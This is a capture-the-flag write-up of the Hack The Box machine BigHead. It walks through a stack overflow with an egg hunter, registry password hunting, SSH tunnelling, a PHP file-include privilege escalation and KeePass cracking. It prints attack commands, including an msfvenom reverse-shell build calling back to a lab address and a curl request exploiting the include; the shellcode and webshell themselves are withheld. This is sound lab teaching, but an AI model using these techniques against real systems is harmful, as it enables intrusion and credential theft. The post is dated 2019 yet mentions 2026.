---
layout: post
title: "The Web Server That Was Homemade"
subtitle: "HTB BigHead, where a hand-rolled web server gets a stack overflow squeezed through an egg hunter, then root hides inside a file hiding inside another file"
date: 2019-05-11 12:00:00 +0000
description: "A custom web server with its source on GitHub eats a stack overflow through an egg hunter, then the root flag turns out to be a KeePass database hidden in an alternate data stream."
image: /assets/og/the-web-server-that-was-homemade.png
tags: [hackthebox, writeup]
---

BigHead is a box that builds its own coffin. Somebody wrote a web server from scratch, in C, on Windows, and then published the source on GitHub so you could read exactly where the wood is rotten. One open port answers, and behind it sits a tower of custom code and inside jokes. You reverse the binary, find an `strcpy` with no seatbelt, and then spend a long night squeezing a working exploit through a space barely big enough to hold a sentence. That gets you a foothold. Climbing the rest takes a leaked registry password, an SSH jail you have to tunnel into and then break out of, a PHP include that loads any file you name, and finally a root flag that is not a flag at all but a password database hidden inside an alternate data stream, locked with a key hidden inside a picture. Insane is the right label. Nothing here is one trick. It is six tricks stacked into a ladder.

```
        B I G H E A D   W E B   S V R   1 . 0
        =====================================
        port 80   "i wrote this myself"
                  the source is on github. so is the bug.
                       |
        HEAD /  + 219 bytes of hex  ->  strcpy off the end of the stack
                       |
        no room for a payload. so leave an egg in memory,
        and send a tiny hunter to go find it.
                       |
                       v
        registry password -> ssh jail -> php include -> SYSTEM
        and root is a file. hiding inside another file.
                                            蛋
```

## 0x01 · one port, a thousand doors

`nmap -sC -sV` against the box is almost insulting in how little it gives back. One port.

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0
```

A single nginx on 80, and the TTL on the ping reply sits near 128, which is the quiet Windows tell. One door usually means the box wants you to look harder at that one door rather than wider across many. So you start splitting hairs. The site calls itself bighead.htb, and the moment a site has a name like that, you go hunting for its relatives. Same IP, different names in the `Host` header, different sites served. Picture an apartment building with one street entrance but a wall of buzzers inside. The street door is port 80. The buzzers are virtual hosts, and `wfuzz` mashes every one.

```
$ wfuzz -u http://10.10.10.112 -H "Host: FUZZ.bighead.htb" \
    -w subdomains.txt --hw 0
000012:  C=200   dev.bighead.htb
000031:  C=302   code.bighead.htb     -> phpinfo
000044:  C=200   mailer.bighead.htb
```

Three relatives wake up. `dev` is a development site, `code` redirects into a `phpinfo` page that spills the whole PHP config, and `mailer` is a contact form. Directory brute forcing on the main host with `gobuster` turns up a `/backend` that bounces to `/BigHead` and a clutch of teapot jokes, endpoints like `/coffee` that answer with HTTP 418, the I'm-a-teapot status code that exists purely as a joke in the spec. The box has a sense of humor, and the humor is a map. Follow it.

## 0x02 · the server with its source on github

Read the response headers closely and one line does not belong.

```
Server: BigheadWebSvr 1.0
```

That is not nginx. nginx is out front as a reverse proxy, but something homemade is sitting behind it. A server name that specific is a search term, and the search lands on a public GitHub repo holding the source for exactly this server, plus a `BHWS_Backup.zip` of the build. The archive is encrypted, but a zip password is just a word, and `zip2john` plus `rockyou.txt` coughs it up fast.

```
$ zip2john BHWS_Backup.zip > zip.hash
$ john --wordlist=rockyou.txt zip.hash
thepiedpiper89   (BHWS_Backup.zip)
```

Git keeps every draft it ever held, so walking back through the commit history surfaces an older backup with its own weaker password, `bighead`, and between the two you have the compiled `BigheadWebSvr.exe` and its DLLs sitting on your own disk. This is the gift and the trap of writing your own server. A real product gets thousands of eyes and decades of hardening. A homemade one gets exactly the care its single author had time for, and now you are holding its guts in a debugger. Think of it like finding the architect's original blueprints in a dumpster behind the bank. You no longer have to feel for the weak wall in the dark. It is circled in red.

## 0x03 · the strcpy with no seatbelt

Open the binary in a disassembler and trace how it handles a request. A function deep in the connection handler takes the URL you send and runs an `strcpy` from your bytes into a fixed slot on the stack. `strcpy` copies until it hits a zero byte and never once checks whether the destination has room. Send more than the slot holds and the copy keeps writing, straight past the end, over the saved return address, the four bytes the CPU trusts to know where to go next when the function finishes.

Think of the stack as a row of lockers, and the very last locker holds a note that says which room to walk to when you are done. `strcpy` is a clerk filling lockers from a list and never counting how many lockers exist. Hand him a list longer than the row and he keeps filling, scribbles over the directions note, and now when work ends he walks wherever your overflow told him to. Control that note and you control the box.

There is a cruelty baked in. The request has to be a `HEAD` and stay under 219 bytes, and the bytes get treated as hex and decoded to binary before they land. After you spend the budget reaching the return address and pointing it at a `JMP ESP` gadget inside one of the server's own DLLs, you are left with roughly 132 bytes for a payload. A reverse shell does not fit in 132 bytes. Not even close.

## 0x04 · the egg hunt

This is where BigHead earns its rating. When the payload will not fit in the hole, you do not shrink the payload. You split the job. You spray the real shellcode somewhere else in the server's memory ahead of time, tag it with a marker, and then use your tiny 132-byte budget for one small program whose only job is to crawl memory looking for that marker and jump to whatever follows it. That small program is an egg hunter, and the marker is the egg.

Picture leaving a sandwich in a huge unmarked locker room, then handing a courier a sticky note that just says find the locker tagged ICBG and eat what is inside. The courier is dumb and small and cheap to send. The sandwich can be any size, because it traveled separately. The hard part was never the meal. It was getting a courier through a very narrow door.

Concretely, you spray the full `windows/shell_reverse_tcp` shellcode into memory with a flood of POST requests, each one prefixed with the egg, the four-byte tag repeated so the hunter has something unmistakable to match. Mona generates the 32-byte hunter; pick a clean tag of your own, say `ICBG`, and avoid the bad bytes `\x00`, `\x0a`, and `\x0d` that the parser would choke on.

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 \
    -b '\x00\x0a\x0d' -f python -v shell
# prepend the egg tag, then spray it into memory many times:
#   POST / with body = ICBGICBG + [ staged reverse shellcode ]
# then fire the HEAD overflow that lands on JMP ESP -> egg hunter
```

The reverse shell itself stays bracketed on purpose. The whole point of the stage is that it is a self-contained backdoor, and a real one belongs in a lab and nowhere else. Fire the `HEAD` request last. It overflows the stack, lands on `JMP ESP`, runs the egg hunter, the hunter walks memory until it finds `ICBGICBG`, and execution falls into the shellcode that was waiting there the whole time. The shell can take up to fifteen minutes to call back, because the server hands connections to a pool. Patience is part of the exploit.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.112
C:\> whoami
piedpiper\nelson
```

## 0x05 · a password the registry kept

`nelson` is a low user, and Windows hoards secrets in the registry, so you ask it directly. The classic sweep walks the whole hive looking for the literal word password.

```
C:\> reg query HKLM /f password /t REG_SZ /s
```

Most of what comes back is a troll, a fake `PasswordHash` that decodes to an insult. But near it sits a real value, an `Authenticate` field holding `H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87`. That is the password for a Bitvise SSH server bound to port 2020, which the firewall keeps strictly local. You cannot reach 2020 from outside, so you build a tunnel through the shell you already own, forwarding the box's own 2020 back to yourself with `plink.exe` or chisel, and then SSH in as `nginx`.

```
$ ssh nginx@localhost -p 2020
nginx@BIGHEAD:/$ 
```

It works, and it is also a cage. Bitvise drops you into BvShell, a jail that only knows a handful of built-in commands and lets you touch almost nothing. You are inside the building and locked in a phone booth.

## 0x06 · the include that loads anything

Look at what the jail can still reach, and a TestLink app is running on a local-only port, 5080. Its source has a file called `linkto.php`, and inside it a pattern that should make anyone wince.

```php
if (isset($_POST['PiperID'])) {
    $PiperCoinAuth = $_POST['PiperCoinID'];
    require_once($PiperCoinAuth);   // your string. its require.
}
```

`require_once` runs whatever PHP file you point it at, and the path comes straight from your POST body. Tell it to include a file you drop on disk and the server executes that file. Think of it like a printer with a setting that says print the document at this path, and the path field accepts anywhere on the machine. Hand it the path to a page full of commands and it does not print them. It runs them.

So you write a small PHP launcher, drop it somewhere world-writable like Nelson's temp folder, and POST its path to `linkto.php`.

```
# drop the launcher (described, not printed):
#   C:\Users\Nelson\AppData\Local\Temp\iceberg.php
#     <?php [ one-line webshell: run the cmd request parameter ] ?>
# then trigger it:
$ curl -s http://127.0.0.1:5080/testlink/linkto.php \
    --data 'PiperID=1&PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\iceberg.php&cmd=whoami'
nt authority\system
```

The webshell stays bracketed for the same reason as always. A one-line PHP backdoor is the most quarantined string in the antivirus dictionary, and writing it to disk for real is how you ship a copy-paste door. TestLink runs as SYSTEM, so the include runs as SYSTEM, and now you own the box. Almost.

## 0x07 · root, hiding inside another file

You go to read `root.txt` and it is a fake, another troll. The real prize is buried, and the trail starts in a `keepass.config.xml` that points at a KeePass database. The database is not a normal file on disk. It is stored as an alternate data stream, a second hidden stream of bytes riding along on an innocent-looking file. NTFS lets any file carry extra streams that do not show in a normal listing and do not count against the visible size. Think of it like a book where chapter one is printed in plain ink, but a second whole story is written between the lines in invisible ink that only shows when you know to ask for it.

You ask for it by stream name, copy the hidden database out, and pull it back over SMB to your own machine. Opening it needs both a master password and a keyfile, and the keyfile turns out to be `admin.png`, a picture sitting in the Administrator's Pictures folder. KeePass with a keyfile is a two-lock vault. You have one lock, the picture; the other is a password you still have to crack.

```
$ keepass2john -k admin.png db.kdbx > keepass.hash
$ hashcat -m 13400 keepass.hash rockyou.txt
...darkness
$ kpcli --kdb db.kdbx --key admin.png
kpcli:/> show -f /chest/hash/root.txt
```

Mode 13400 is hashcat's KeePass format, and `rockyou` finds the master word, `darkness`. Open the database with the password and the picture together, walk to the right entry, and the root flag is finally the value inside it.

```
C:\> type \Users\Administrator\Pictures\admin.png:nothing-to-see
# root.txt lived as an ADS, locked in a kdbx, keyed by a picture
████████████████████████████████
```

## 0x08 · the honest caveat

The headline temptation is to file BigHead under exploit-dev showmanship, the egg hunter as a party trick you will never use at work. The buffer overflow specifics are genuinely a fossil. Nobody fronts a 2008-era hand-written C server in 2026, and modern compilers, stack canaries, and ASLR would have strangled this exact overflow in the crib. But step back and the real lesson is not the egg hunter at all. It is the decision to write your own web server.

Every shortcut on this box traces to homemade infrastructure standing where a hardened, battle-tested one should have been. A custom server instead of a reviewed one, with its source and its bug published together. A homegrown auth check in a PHP file that includes any path you name. Secrets stuffed in the registry and a database hidden in a data stream, both of which felt clever and neither of which is a real boundary, only a disguise. Security through I-wrote-it-myself and security through nobody-will-look-there are the same bet, and the bet is that no attacker is curious. BigHead is the box that calls it.

And keep the ADS in your pocket. A file hiding inside another file is not protection. It is a costume, and the moment someone knows the stream is there, the costume is off. The same goes for the registry password and the inside-joke endpoints. Obscurity buys you the time it takes a stranger to look in the obvious second place, and a determined stranger always looks.

## 0x09 · outro

```
they wrote their own server and shipped the blueprint with it.
the payload would not fit, so you sent a courier to find it.
the root flag was a file wearing another file as a coat.

none of it was magic. all of it was homemade where it should have been bought.
obscurity is a costume. attention is the wind that takes it off.

reverse the binary. hunt the egg. read the stream. wear black.

                                                            EOF
```

---

*HTB: BigHead, retired 30 Mar 2019. An insane Windows box behind a Linux-flavored front, really a lecture on the cost of rolling your own. The egg still hunts in a lab and nowhere you don't own. (Date note: the box info lists 30 Mar 2019 as the retirement; the public write-up landed about a month later, which is normal for the hard ones.)*